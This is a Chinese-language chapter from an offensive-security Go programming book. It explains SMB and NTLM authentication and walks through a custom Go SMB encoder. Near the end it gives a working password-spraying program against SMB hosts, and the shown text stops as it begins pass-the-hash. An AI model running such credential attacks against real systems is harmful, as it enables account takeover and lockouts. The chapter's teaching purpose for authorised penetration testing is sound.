## 第六章：与 SMB 和 NTLM 的交互

![Image](img/common.jpg)

在前几章中，你研究了用于网络通信的各种常见协议，包括原始 TCP、HTTP 和 DNS。每个协议对于攻击者都有有趣的用例。尽管存在大量其他网络协议，我们将通过研究 *服务器消息块* *(SMB)* 协议来结束网络协议的讨论，SMB 协议无疑是 Windows 后期利用中最有用的协议。

SMB 可能是你在本书中看到的最复杂的协议。它有多种用途，但 SMB 常用于在网络中共享资源，如文件、打印机和串口。对于攻击者来说，SMB 允许通过命名管道在分布式网络节点之间进行进程间通信。换句话说，你可以在远程主机上执行任意命令。这本质上就是 PsExec 工具的工作原理，PsExec 是一个在本地执行远程命令的 Windows 工具。

SMB 还有其他几个有趣的用例，尤其是由于它处理 *NT LAN Manager (NTLM) 身份验证* 的方式，NTLM 是一种在 Windows 网络中广泛使用的挑战-响应安全协议。这些用例包括远程密码猜测、基于哈希的身份验证（或 *pass-the-hash*）、SMB 中继和 NBNS/LLMNR 欺骗。要覆盖这些攻击，每一项都可以写成一本书。

本章将从详细解释如何在 Go 中实现 SMB 开始。接下来，你将利用 SMB 包执行远程密码猜测，使用 pass-the-hash 技术仅凭密码的哈希值成功进行身份验证，并破解密码的 NTLMv2 哈希。

### SMB 包

在写作本文时，Go 中尚未有官方的 SMB 包，但我们创建了一个包，你可以在 [*https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/*](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/) 中找到本书友好的版本。虽然我们在本章不会展示该包的每个细节，但你仍将学习如何解释 SMB 规范的基础知识，以便创建必要的二进制通信来“讲 SMB”，这与前几章你仅仅重用了完全兼容的包不同。你还将学习如何使用一种叫做 *反射* 的技术，在运行时检查接口数据类型，并定义任意的 Go 结构体字段标签，以便编组和解组复杂的、任意的数据，同时为未来的消息结构和数据类型保持可扩展性。

虽然我们构建的 SMB 库仅允许基本的客户端通信，但代码库相当庞大。你将看到来自 SMB 包的相关示例，以便你能完全理解如何进行通信和任务，例如 SMB 身份验证。

### 理解 SMB

SMB 是一个应用层协议，类似于 HTTP，它允许网络节点相互通信。与使用 ASCII 可读文本的 HTTP 1.1 不同，SMB 是一个二进制协议，使用固定和可变长度、位置以及小端字段的组合。SMB 有多个版本，也称为*方言*——即版本 2.0、2.1、3.0、3.0.2 和 3.1.1。每个方言的性能都优于其前代版本。由于不同方言的处理和要求有所不同，因此客户端和服务器必须事先就使用哪种方言达成一致。它们通过初始的消息交换完成这一过程。

通常，Windows 系统支持多个方言，并选择客户端和服务器都支持的最新方言。微软提供了表 6-1，展示了在协商过程中，哪些 Windows 版本选择了哪些方言。（Windows 10 和 WS 2016——图中未显示——协商使用 SMB 版本 3.1.1。）

**表 6-1：** Windows 版本协商的 SMB 方言

| **操作系统** | **Windows 8.1 WS 2012 R2** | **Windows 8 WS 2012** | **Windows 7 WS 2008 R2** | **Windows Vista WS 2008** | **旧版本** |
| --- | --- | --- | --- | --- | --- |
| Windows 8.1 WS 2012 R2 | **SMB 3.02** | **SMB 3.0** | SMB 2.1 | SMB 2.0 | SMB 1.0 |
| Windows 8 WS 2012 | **SMB 3.0** | **SMB 3.0** | SMB 2.1 | SMB 2.0 | SMB 1.0 |
| Windows 7 WS 2008 R2 | SMB 2.1 | SMB 2.1 | SMB 2.1 | SMB 2.0 | SMB 1.0 |
| Windows Vista WS 2008 | SMB 2.0 | SMB 2.0 | SMB 2.0 | SMB 2.0 | SMB 1.0 |
| 旧版本 | SMB 1.0 | SMB 1.0 | SMB 1.0 | SMB 1.0 | SMB 1.0 |

在本章中，你将使用 SMB 2.1 方言，因为大多数现代 Windows 版本都支持它。

#### 理解 SMB 安全令牌

SMB 消息包含用于在网络中对用户和计算机进行身份验证的*安全令牌*。与选择 SMB 方言的过程类似，选择身份验证机制是通过一系列的会话设置消息进行的，这些消息允许客户端和服务器就共同支持的身份验证类型达成一致。活动目录域通常使用*NTLM 安全支持提供程序*（*NTLMSSP*），这是一种二进制位置协议，它将 NTLM 密码哈希与挑战-响应令牌结合使用，以便在网络中验证用户。*挑战-响应令牌*类似于一个加密问题的答案；只有知道正确密码的实体才能正确回答这个问题。尽管本章仅专注于 NTLMSSP，Kerberos 也是一种常见的身份验证机制。

将身份验证机制与 SMB 规范本身分离，使得 SMB 可以根据域和企业的安全要求以及客户端和服务器的支持，在不同的环境中使用不同的身份验证方法。然而，身份验证与 SMB 规范的分离使得在 Go 中实现变得更加困难，因为身份验证令牌是*抽象语法表示法（ASN.1）* 编码的。对于本章内容，你无需了解 ASN.1 的太多细节——只需知道它是一种二进制编码格式，与用于一般 SMB 的位置二进制编码不同。这种混合编码增加了复杂性。

理解 NTLMSSP 对于创建一个足够智能的 SMB 实现至关重要，这样它就可以在选择性地序列化和反序列化消息字段时，同时考虑到相邻字段（在同一个消息中）可能会被以不同的方式编码或解码。Go 提供了标准包用于二进制和 ASN.1 编码，但 Go 的 ASN.1 包并不是为通用用途而设计的，因此你必须考虑一些细微差别。

#### 设置 SMB 会话

客户端和服务器执行以下过程以成功建立 SMB 2.1 会话并选择 NTLMSSP 方言：

1.  客户端向服务器发送一个协商协议请求。该消息包括客户端支持的方言列表。

1.  服务器回复一个协商协议响应消息，指示服务器选择的方言。未来的消息将使用该方言。响应中包括服务器支持的身份验证机制列表。

1.  客户端选择一种支持的身份验证类型，例如 NTLMSSP，并使用该信息创建并发送一个会话设置请求消息到服务器。该消息包含一个封装的安全结构，表明这是一个 NTLMSSP 协商请求。

1.  服务器回复一个会话设置响应消息。该消息表明需要更多处理，并包含一个服务器挑战令牌。

1.  客户端计算用户的 NTLM 哈希——该哈希使用域、用户和密码作为输入——然后将其与服务器挑战、随机客户端挑战以及其他数据结合，生成挑战响应。它将此信息包含在一个新的会话设置请求消息中，并发送给服务器。与第 3 步发送的消息不同，封装的安全结构表明这是一个 NTLMSSP 身份验证请求。通过这种方式，服务器可以区分这两个会话设置 SMB 请求。

1.  服务器与一个权威资源（如域控制器）进行交互，使用域凭证进行身份验证，将客户端提供的挑战-响应信息与权威资源计算的值进行比较。如果匹配，则客户端通过认证。服务器向客户端发送会话设置响应消息，指示登录成功。该消息包含一个唯一的会话标识符，客户端可以用它来跟踪会话状态。

1.  客户端发送额外的消息以访问文件共享、命名管道、打印机等；每条消息都包括会话标识符，作为服务器验证客户端认证状态的参考。

你现在可能已经开始看到 SMB 的复杂性，并理解为什么没有标准或第三方的 Go 包实现 SMB 规范。我们不会采取全面的方法讨论我们创建的每一个库的细节，而是专注于一些结构、消息或独特的方面，这些内容可以帮助你实现自己版本的明确网络协议。本章将讨论一些关键内容，避免信息过载，而不是列出大量代码。

你可以将以下相关规范作为参考，但不必强迫自己阅读每一份。通过 Google 搜索，你可以找到最新的修订版。

**MS-SMB2** 是我们尝试遵循的 SMB2 规范。这是主要的关注规范，封装了用于执行认证的通用安全服务应用程序接口（GSS-API）结构。

**MS-SPNG 和 RFC 4178** 是 GSS-API 规范，其中 MS-NLMP 数据被封装。该结构是 ASN.1 编码的。

**MS-NLMP** 是用于理解 NTLMSSP 认证令牌结构和挑战-响应格式的规范。它包括计算 NTLM 哈希和认证响应令牌等内容的公式和细节。与外部的 GSS-API 容器不同，NTLMSSP 数据并非 ASN.1 编码。

**ASN.1** 是一种使用 ASN.1 格式编码数据的规范。

在我们讨论包中的有趣代码片段之前，你需要了解一些挑战，这些挑战需要克服才能实现有效的 SMB 通信。

#### 使用结构字段的混合编码

正如我们之前提到的，SMB 规范要求大多数消息数据采用位置性、二进制、小端、固定和可变长度编码。但有些字段需要 ASN.1 编码，ASN.1 编码使用显式标记的标识符来表示字段索引、类型和长度。在这种情况下，许多 ASN.1 子字段是可选的，并且不限制在消息字段中的特定位置或顺序。这可能有助于澄清挑战。

在 Listing 6-1 中，你可以看到一个假设的 `Message` 结构体，它呈现了这些挑战。

```
type Foo struct {
    X int
    Y []byte
}
type Message struct {
    A int    // Binary, positional encoding
    B Foo    // ASN.1 encoding as required by spec
    C bool   // Binary, positional encoding
}
```

*列表 6-1：一个假设的结构体示例，要求对字段使用不同的编码方式*

问题的关键在于，你不能使用相同的编码方案来编码`Message`结构体中的所有类型，因为`B`，一个`Foo`类型，预计采用 ASN.1 编码，而其他字段则不需要。

##### 编写自定义序列化和反序列化接口

回顾前面的章节，编码方案如 JSON 或 XML 会递归地使用相同的编码格式对结构体和所有字段进行编码。这种方式简洁且直观。但在这里你没有这种奢侈的条件，因为 Go 的`binary`包也以相同的方式工作——它递归地对所有结构体和结构体字段进行编码，但这对你来说行不通，因为消息需要混合编码：

```
binary.Write(someWriter, binary.LittleEndian, message)
```

解决方案是创建一个接口，允许任意类型定义自定义的序列化和反序列化逻辑（列表 6-2）。

```
❶ type BinaryMarshallable interface {
    ❷ MarshalBinary(*Metadata) ([]byte, error)
    ❸ UnmarshalBinary([]byte, *Metadata) error
   }
```

*列表 6-2：需要自定义序列化和反序列化方法的接口定义*

接口❶，`BinaryMarshallable`，定义了两个必须实现的方法：`MarshalBinary()` ❷和`UnmarshalBinary()` ❸。不要太担心传入函数的`Metadata`类型，因为理解主要功能时它并不重要。

##### 封装接口

任何实现了`BinaryMarshallable`接口的类型都可以控制自己的编码。不幸的是，这并不像在`Foo`数据类型上定义几个函数那么简单。毕竟，Go 的`binary.Write()`和`binary.Read()`方法用于编码和解码二进制数据时，并不了解你自定义的接口。你需要创建一个`marshal()`和`unmarshal()`包装函数，在其中检查数据，以确定类型是否实现了`BinaryMarshallable`接口，如列表 6-3 所示。 （所有位于根目录的代码清单都存在于提供的 GitHub 仓库* [`github.com/blackhat-go/bhg/`](https://github.com/blackhat-go/bhg/)*）。

```
func marshal(v interface{}, meta *Metadata) ([]byte, error) {
    --snip--
    bm, ok := v.(BinaryMarshallable) ❶
    if ok {
        // Custom marshallable interface found.
        buf, err := bm.MarshalBinary(meta) ❷
        if err != nil {
            return nil, err
        }
        return buf, nil
    }
    --snip--
}
--snip--
func unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {
    --snip--
    bm, ok := v.(BinaryMarshallable) ❸
    if ok {
        // Custom marshallable interface found.
        if err := bm.UnmarshalBinary(buf, meta)❹; err != nil {
            return nil, err
        }
        return bm, nil
    }
    --snip--
}
```

*列表 6-3：使用类型断言执行自定义数据序列化和反序列化（*[/ch-6/smb/smb/encoder/encoder.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go)）*

示例 6-3 详细介绍了从[*https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go*](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go)中提取的`marshal()`和`unmarshal()`函数的一个子集。两个函数都包含类似的代码段，试图将提供的接口`v`断言为名为`bm`的`BinaryMarshallable`变量 ❶❸。只有当`v`的实际类型实现了`BinaryMarshallable`接口所需的必要函数时，这种断言才会成功。如果成功，`marshal()`函数 ❷ 会调用`bm.MarshalBinary()`，而`unmarshal()`函数 ❹ 会调用`bm.UnmarshalBinary()`。此时，程序流程将分支到该类型的编码和解码逻辑，从而允许该类型完全控制其处理方式。

##### 强制进行 ASN.1 编码

让我们来看看如何强制将你的`Foo`类型进行 ASN.1 编码，同时保持`Message`结构中的其他字段不变。为此，你需要在该类型上定义`MarshalBinary()`和`UnmarshalBinary()`函数，如示例 6-4 所示。

```
func (f *Foo) MarshalBinary(meta *encoder.Metadata) ([]byte, error) {
    buf, err := asn1.Marshal(*f)❶
    if err != nil {
        return nil, err
    }
    return buf, nil
}

func (f *Foo) UnmarshalBinary(buf []byte, meta *encoder.Metadata) error {
    data := Foo{}
    if _, err := asn1.Unmarshal(buf, &data)❷; err != nil {
        return err
    }
    *f = data
    return nil
}
```

*示例 6-4：为 ASN.1 编码实现`BinaryMarshallable`接口*

这些方法几乎不做什么，除了调用 Go 的`asn1.Marshal()` ❶和`asn1.Unmarshal()` ❷函数。你可以在[`gss`](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/gss/gss.go)包的代码中找到这些函数的变种。它们的唯一真实区别在于，`gss`包的代码对 Go 的`asn1`编码函数做了额外的调整，使其与 SMB 规范中定义的数据格式兼容。

`ntlmssp`包位于[*https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go*](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go)中，包含了`MarshalBinary()`和`UnmarshalBinary()`函数的另一种实现。尽管它没有展示 ASN.1 编码，`ntlmssp`代码展示了如何通过使用必要的元数据来处理任意数据类型的编码。元数据——可变长度`byte`切片的长度和偏移量——与编码过程密切相关。这些元数据引导我们进入下一个你需要解决的挑战。

#### 理解元数据和引用字段

如果你深入研究 SMB 规范，你会发现一些消息包含引用同一消息中其他字段的字段。例如，来自协商响应消息的字段，引用了包含实际值的可变长度字节切片的偏移量和长度：

**SecurityBufferOffset (2 字节)：** 从 SMB2 头部开始到安全缓冲区的偏移量（以字节为单位）。

**SecurityBufferLength (2 字节)：** 安全缓冲区的长度（以字节为单位）。

这些字段本质上充当了元数据。在消息规范后续部分，你将找到实际存储数据的可变长度字段：

**Buffer（变量）：** 包含响应的安全缓冲区的可变长度缓冲区，具体由 SecurityBufferOffset 和 SecurityBufferLength 指定。该缓冲区应该包含由 GSS 协议生成的令牌，具体见第 3.3.5.4 节。如果 SecurityBufferLength 为 0，则此字段为空，客户端发起的身份验证（使用客户端选择的身份验证协议）将取代服务器发起的 SPNEGO 身份验证，具体描述见[MS-AUTHSOD]第 2.1.2.2 节。

一般来说，SMB 规范是通过固定位置的长度和偏移量字段来一致地处理可变长度数据的，这些字段表示数据本身的大小和位置。这不仅仅适用于响应消息或协商消息，通常你会在单个消息中发现多个字段使用这种模式。实际上，只要你有一个可变长度字段，你就会发现这种模式。元数据明确地指示消息接收方如何定位和提取数据。

这很有用，但它使得编码策略变得复杂，因为你现在需要维护结构体内不同字段之间的关系。例如，你不能仅仅对整个消息进行序列化，因为某些元数据字段（例如，长度和偏移量）直到数据本身被序列化后才会知道，或者在偏移量的情况下，所有位于数据之前的字段都必须被序列化。

#### 理解 SMB 实现

本小节的其余部分涉及我们设计的 SMB 实现中的一些复杂细节。你无需理解这些信息就能使用这个包。

我们尝试了多种处理引用数据的方法，最终选择了一种结合了结构体字段标签和反射的方案。回想一下，*反射*是一种程序能够自我检查的技术，特别是检查类似于程序自身数据类型的内容。*字段标签*在某种程度上与反射相关，因为它们定义了有关结构体字段的任意元数据。你可能在之前的 XML、MSGPACK 或 JSON 编码示例中见过它们。例如，示例 6-5 使用结构体标签来定义 JSON 字段名称。

```
type Foo struct {
    A int    `json:"a"`
    B string `json:"b"`
}
```

*示例 6-5：定义 JSON 字段标签的结构体*

Go 的`reflect`包包含了我们用来检查数据类型并提取字段标签的函数。那时，问题就在于解析标签并对其值执行有意义的操作。在示例 6-6 中，你可以看到在 SMB 包中定义的结构体。

```
type NegotiateRes struct {
    Header
    StructureSize        uint16
    SecurityMode         uint16
    DialectRevision      uint16
    Reserved             uint16
    ServerGuid           []byte `smb:"fixed:16"`❶
    Capabilities         uint32
    MaxTransactSize      uint32
    MaxReadSize          uint32
    MaxWriteSize         uint32
    SystemTime           uint64
    ServerStartTime      uint64
    SecurityBufferOffset uint16 `smb:"offset:SecurityBlob"`❷
    SecurityBufferLength uint16 `smb:"len:SecurityBlob"`❸
    Reserved2            uint32
    SecurityBlob         *gss.NegTokenInit
}
```

*示例 6-6：使用 SMB 字段标签定义字段元数据 (*[/ch-6/smb/smb/smb.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/smb.go)*)*

该类型使用了三个字段标签，通过 SMB 键进行标识：`fixed` ❶，`offset` ❷，和`len` ❸。请记住，我们选择这些名称都是随意的。您不必使用特定的名称。每个标签的意图如下：

+   `fixed`标识`[]byte`为一个固定长度的字段，大小为提供的尺寸。在这种情况下，`ServerGuid`的长度为 16 字节。

+   `offset`定义了从结构体开始到可变长度数据缓冲区的第一个位置之间的字节数。该标签定义了字段的名称——在此情况下是`SecurityBlob`——该偏移量与之相关。通过该引用名称的字段预计存在于相同的结构体中。

+   `len`定义了一个可变长度数据缓冲区的长度。该标签定义了字段的名称——在此情况下是`SecurityBlob`，该长度与之相关。通过这个引用名称的字段应该存在于相同的结构体中。

如您所注意到的，我们的标签不仅允许我们通过任意元数据在不同字段之间创建关系，还能区分固定长度字节切片和可变长度数据。不幸的是，添加这些结构体标签并不会神奇地解决问题。代码需要有逻辑来查找这些标签，并在序列化和反序列化时对其执行特定操作。

##### 解析和存储标签

在清单 6-7 中，名为`parseTags()`的便利函数执行标签解析逻辑，并将数据存储在一个类型为`TagMap`的辅助结构体中。

```
func parseTags(sf reflect.StructField❶) (*TagMap, error) {
    ret := &TagMap{
        m:   make(map[string]interface{}),
        has: make(map[string]bool),
    }
    tag := sf.Tag.Get("smb")❷
    smbTags := strings.Split(tag, ",")❸
    for _, smbTag := range smbTags❹ {
        tokens := strings.Split(smbTag, ":")❺
        switch tokens[0] { ❻
        case "len", "offset", "count":
            if len(tokens) != 2 {
                return nil, errors.New("Missing required tag data. Expecting key:val")
            }
            ret.Set(tokens[0], tokens[1])
        case "fixed":
            if len(tokens) != 2 {
                return nil, errors.New("Missing required tag data. Expecting key:val")
            }
            i, err := strconv.Atoi(tokens[1])
            if err != nil {
                return nil, err
 }
            ret.Set(tokens[0], i) ❼

    }
```

*清单 6-7：解析结构体标签（*[/ch-6/smb/smb/encoder/encoder.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go)）*

该函数接受一个名为`sf`的参数，其类型为`reflect.StructField` ❶，这是 Go 语言`reflect`包内定义的一个类型。代码在`StructField`变量上调用`sf.Tag.Get("smb")`来检索在字段上定义的任何`smb`标签 ❷。同样，这是我们为程序选择的一个任意名称。我们只需要确保用于解析标签的代码使用与我们在结构体类型定义中使用的相同的键。

然后我们将`smb`标签按逗号 ❸ 分割，以防将来需要在单个结构体字段上定义多个`smb`标签，并遍历每个标签 ❹。我们按冒号 ❺ 分割每个标签——回想一下，我们使用的是`name:value`格式的标签，如`fixed:16`和`len:SecurityBlob`。将单个标签数据分离为基本的键值对后，我们使用`switch`语句对键进行特定的验证逻辑，例如将`fixed`标签的值转换为整数 ❻。

最后，函数将数据存储在我们自定义的名为`ret`的映射中 ❼。

##### 调用`parseTags()`函数并创建`reflect.StructField`对象

那么，我们如何调用这个函数，如何创建一个`reflect.StructField`类型的对象呢？为了解答这些问题，请查看列表 6-8 中的`unmarshal()`函数，它位于与我们`parseTags()`便捷函数相同的源文件中。`unmarshal()`函数非常长，所以我们只提取出最相关的部分。

```
func unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {
    typev := reflect.TypeOf(v) ❶
    valuev := reflect.ValueOf(v) ❷
    --snip--
    r := bytes.NewBuffer(buf)
    switch typev.Kind() { ❸
    case reflect.Struct:
        --snip--
    case reflect.Uint8:
        --snip--
    case reflect.Uint16:
        --snip--
    case reflect.Uint32:
        --snip--
    case reflect.Uint64:
        --snip--
    case reflect.Slice, reflect.Array:
        --snip--
    default:
        return errors.New("Unmarshal not implemented for kind:" + typev.Kind().String()), nil
    }

    return nil, nil

}
```

*列表 6-8：使用反射动态地反序列化未知类型 (*[/ch-6/smb/smb/encoder/encoder.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go)*)*

`unmarshal()`函数使用 Go 的`reflect`包来检索目标接口的类型❶和数据❷，我们的数据缓冲区将被反序列化到该接口中。这是必要的，因为为了将任意的字节切片转换为结构体，我们需要知道结构体中有多少个字段，以及每个字段需要读取多少字节。例如，定义为`uint16`的字段占用 2 个字节，而`uint64`占用 8 个字节。通过使用反射，我们可以查询目标接口，了解它的数据类型，以及如何处理数据的读取。由于每种类型的逻辑不同，我们通过调用`typev.Kind()` ❸来对类型进行`switch`，它返回一个`reflect.Kind`实例，指示我们正在处理的数据类型。你会看到我们为每个允许的数据类型都有单独的`case`。

##### 处理结构体

让我们来看一下处理结构体类型的`case`块，位于列表 6-9，因为这是一个可能的初始入口点。

```
case reflect.Struct:
        m := &Metadata{ ❶
            Tags:       &TagMap{},
            Lens:       make(map[string]uint64),
            Parent:     v,
            ParentBuf:  buf,
            Offsets:    make(map[string]uint64),
            CurrOffset: 0,
    }
    for i := 0; i < typev.NumField(); i++ { ❷
        m.CurrField = typev.Field(i).Name❸
        tags, err := parseTags(typev.Field(i))❹
        if err != nil {
            return nil, err
        }
        m.Tags = tags
        var data interface{}
        switch typev.Field(i).Type.Kind() { ❺
            case reflect.Struct:
                data, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Addr().Interface(), m)❻
            default:
                data, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Interface(), m)❼
        }
        if err != nil {
            return nil, err
        }
        valuev.Field(i).Set(reflect.ValueOf(data)) ❽
    }
 v = reflect.Indirect(reflect.ValueOf(v)).Interface()
    meta.CurrOffset += m.CurrOffset ❾
    return v, nil
```

*列表 6-9：反序列化一个结构体类型 (*[/ch-6/smb/smb/encoder/encoder.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go)*)*

`case`块通过定义一个新的`Metadata`对象❶开始，这个类型用于跟踪相关的元数据，包括当前的缓冲区偏移量、字段标签和其他信息。通过我们的类型变量，我们调用`NumField()`方法来获取结构体中的字段数量❷。它返回一个整数值，作为循环的限制条件。

在循环中，我们可以通过调用类型的`Field(index int)`方法来提取当前字段。该方法返回一个`reflect.StructField`类型。你会看到我们在代码片段中多次使用这个方法。可以将它视为通过索引值从切片中提取元素。我们第一次使用❸它来提取字段的名称。例如，`SecurityBufferOffset`和`SecurityBlob`是列表 6-6 中定义的`NegotiateRes`结构体中的字段名称。字段名称被分配给我们`Metadata`对象的`CurrField`属性。第二次调用`Field(index int)`方法时，它被传入`parseTags()`函数❹，该函数位于列表 6-7 中。我们知道这个函数解析我们的结构体字段标签。这些标签被包含在我们的`Metadata`对象中，供以后跟踪和使用。

接下来，我们使用 `switch` 语句针对字段类型进行特别处理 ❺。这里只有两种情况。第一种处理字段本身是一个结构体的情况 ❻，在这种情况下，我们递归调用 `unmarshal()` 函数，将该字段的指针作为接口传递给它。第二种情况处理所有其他类型（原始类型、切片等），递归调用 `unmarshal()` 函数并将字段本身作为接口传递给它 ❼。这两个调用都有一些特殊操作来将缓冲区推进到当前偏移量的位置。我们的递归调用最终返回一个 `interface{}`，这是一个包含我们反序列化数据的类型。我们使用反射将当前字段的值设置为这个接口数据的值 ❽。最后，我们推进缓冲区中的当前偏移量 ❾。

哎呀！你能看到这开发起来会是一个挑战吗？我们为每种输入类型都写了单独的 `case` 处理。幸运的是，处理结构体的 `case` 块是最复杂的。

##### 处理 uint16

如果你真的在认真思考，可能会问：你到底是从哪个地方读取缓冲区的数据呢？答案是在清单 6-9 中并没有直接读取数据。回想一下，我们正在进行递归调用 `unmarshal()` 函数，每次都将内部字段传递给该函数。最终，我们会遇到基本数据类型。毕竟，在某个时刻，最内层的嵌套结构体是由基本数据类型组成的。当我们遇到基本数据类型时，我们的代码会与最外层 `switch` 语句中的不同 `case` 匹配。例如，当我们遇到 `uint16` 数据类型时，这段代码会执行清单 6-10 中的 `case` 块。

```
case reflect.Uint16:
    var ret uint16
    if err := binary.Read(r, binary.LittleEndian, &ret)❶; err != nil {
        return nil, err
    }
    if meta.Tags.Has("len")❷ {
        ref, err := meta.Tags.GetString("len")❸
        if err != nil {
            return nil, err
        }
        meta.Lens[ref]❹ = uint64(ret)
    }
 ❺ meta.CurrOffset += uint64(binary.Size(ret))
    return ret, nil
```

*清单 6-10：反序列化 `uint16` 数据 (*[/ch-6/smb/smb/encoder/encoder.go/](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go)*)*

在这个 `case` 块中，我们调用 `binary.Read()` 函数，从缓冲区中读取数据到变量 `ret` ❶。这个函数足够智能，能够根据目标类型知道要读取多少字节。在这种情况下，`ret` 是一个 `uint16`，所以读取 2 个字节。

接下来，我们检查是否存在 `len` 字段标签 ❷。如果存在，我们就会检索与该键关联的值——也就是字段名 ❸。回想一下，这个值将是当前字段应指向的字段名。由于标识长度的字段位于 SMB 消息中实际数据之前，我们并不知道缓冲区数据实际上存储的位置，因此我们暂时无法采取任何操作。

我们刚刚获得了长度元数据，存储它最合适的地方就是在我们的 `Metadata` 对象中。我们将其存储在一个 `map[string]uint64` 中，保持引用字段名与其长度之间的关系 ❹。换句话说，我们现在知道一个可变长度字节切片需要多长。我们通过刚刚读取的数据的大小来推进当前偏移量 ❺，并返回从缓冲区读取的值。

在处理`offset`标签信息的过程中，类似的逻辑和元数据跟踪也会发生，但我们为了简洁省略了那部分代码。

##### 处理切片

在列表 6-11 中，你可以看到`case`块，它反序列化切片，我们需要在处理过程中考虑到固定长度和可变长度数据，同时使用标签和元数据。

```
case reflect.Slice, reflect.Array:
    switch typev.Elem().Kind()❶ {
    case reflect.Uint8:
        var length, offset int ❷
        var err error
        if meta.Tags.Has("fixed") {
            if length, err = meta.Tags.GetInt("fixed")❸; err != nil {
                return nil, err
            }
 // Fixed length fields advance current offset
            meta.CurrOffset += uint64(length) ❹
        } else {
            if val, ok := meta.Lens[meta.CurrField]❺; ok {
                length = int(val)
            } else {
                return nil, errors.New("Variable length field missing length reference in struct")
            }
            if val, ok := meta.Offsets[meta.CurrField]❻; ok {
                offset = int(val)
            } else {
                // No offset found in map. Use current offset
                offset = int(meta.CurrOffset)
            }
            // Variable length data is relative to parent/outer struct.
            // Reset reader to point to beginning of data
            r = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])
            // Variable length data fields do NOT advance current offset.
        }
        data := make([]byte, length) ❼
        if err := binary.Read(r, binary.LittleEndian, &data)❽; err != nil {
            return nil, err
        }
        return data, nil
```

*列表 6-11：反序列化固定长度和可变长度字节切片（*[/ch-6/smb/smb/encoder/encoder.go/](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/smb/encoder/encoder.go/)*)*

首先，我们使用反射来确定切片的元素类型❶。例如，`[]uint8`的处理方式与`[]uint32`不同，因为每个元素的字节数不同。在这个例子中，我们只处理`[]uint8`切片。接下来，我们定义了两个本地变量`length`和`offset`，用于跟踪要读取的数据的长度以及从缓冲区开始读取的位置❷。如果切片是用`fixed`标签定义的，我们就会获取该值并将其赋给`length`❸。回想一下，`fixed`键的标签值是一个整数，定义了切片的长度。我们将使用这个长度来推进当前缓冲区的偏移量，以便将来读取❹。对于固定长度字段，`offset`保持其默认值——零——因为它将始终出现在当前偏移位置。可变长度切片稍微复杂一些，因为我们需要从`Metadata`结构中检索长度❺和偏移量❻信息。一个字段使用它自己的名称作为数据查找的键。回忆一下我们之前是如何填充这些信息的。通过正确设置`length`和`offset`变量，我们接着创建一个所需长度的切片❼，并在调用`binary.Read()`时使用它❽。再次提醒，这个函数足够智能，能够读取字节，直到我们的目标切片被填充。

这是一次非常详细的旅程，深入探索了自定义标签、反射和编码的黑暗角落，并且略带 SMB 的味道。让我们走出这些丑陋的地方，使用 SMB 库做些有用的事情。幸运的是，接下来的使用案例应该要简单得多。

### 使用 SMB 猜测密码

我们将要检查的第一个 SMB 案例是攻击者和渗透测试人员非常常见的一种情况：通过 SMB 进行在线密码猜测。你会尝试通过提供常用的用户名和密码来对一个域进行身份验证。在开始之前，你需要使用以下`get`命令获取 SMB 包：

```
$ go get github.com/bhg/ch-6/smb
```

一旦包安装完成，我们就可以开始编写代码了。你将编写的代码（见列表 6-12）接受一个包含换行分隔的用户名的文件、一个密码、一个域和目标主机信息作为命令行参数。为了避免将帐户锁定出某些域，你会尝试在一系列用户上使用一个密码，而不是在一个或多个用户上尝试一系列密码。

**警告**

*在线密码猜测可能会导致帐户被锁定，从而有效地形成拒绝服务攻击。测试代码时要小心，只对有授权测试的系统进行此操作。*

```
func main() {
    if len(os.Args) != 5 {
        log.Fatalln("Usage: main </user/file> <password> <domain>
        <target_host>")
    }

    buf, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)
    }
    options := smb.Options❶{
        Password: os.Args[2],
        Domain:   os.Args[3],
        Host:     os.Args[4],
        Port:     445,
    }

    users := bytes.Split(buf, []byte{'\n'})
    for _, user := range users❷ {
     ❸ options.User = string(user)
        session, err := smb.NewSession(options, false)❹
        if err != nil {
            fmt.Printf("[-] Login failed: %s\\%s [%s]\n",
                options.Domain,
                options.User,
                options.Password)
            continue
        }
 defer session.Close()
        if session.IsAuthenticated❺ {
            fmt.Printf("[+] Success     : %s\\%s [%s]\n",
                options.Domain,
                options.User,
                options.Password)
        }
    }
}
```

*列表 6-12: 利用 SMB 包进行在线密码猜测 (*[/ch-6/password-guessing/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/password-guessing/main.go)*)*

SMB 包通过会话进行操作。要建立会话，首先初始化一个 `smb.Options` 实例，它将包含所有会话选项，包括目标主机、用户、密码、端口和域 ❶。接下来，遍历每个目标用户 ❷，适当地设置 `options.User` 值 ❸，然后调用 `smb.NewSession()` ❹。此函数在后台为你处理大量工作：它协商 SMB 方言和认证机制，然后对远程目标进行认证。如果认证失败，函数将返回错误，并根据结果填充 `session` 结构中的布尔值 `IsAuthenticated` 字段。接下来，它将检查该值，以查看认证是否成功，如果成功，则显示成功消息 ❺。

这就是创建在线密码猜测工具所需的全部内容。

### 使用 Pass-the-Hash 技术重用密码

*Pass-the-hash* 技术允许攻击者使用密码的 NTLM 哈希值进行 SMB 认证，即使攻击者没有明文密码。本节将带你了解这一概念，并展示其实现方式。

